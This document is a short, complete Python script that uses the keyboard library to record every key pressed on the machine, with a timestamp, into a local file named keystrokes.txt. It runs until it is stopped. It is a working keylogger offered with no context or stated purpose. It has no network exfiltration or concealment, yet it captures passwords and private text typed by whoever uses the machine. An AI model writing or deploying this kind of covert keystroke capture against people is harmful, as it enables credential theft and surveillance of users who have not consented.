import keyboard
from datetime import datetime

log_file = 'keystrokes.txt'

def on_key_press(event):
    timestamp = datetime.now().strftime('%d/%m/%y %H:%M:%S')  # Format the current time
    with open(log_file, 'a') as f:
        f.write(f'{event.name} {timestamp}\n')  # Write the keystroke and formatted timestamp

keyboard.on_press(on_key_press)

keyboard.wait()
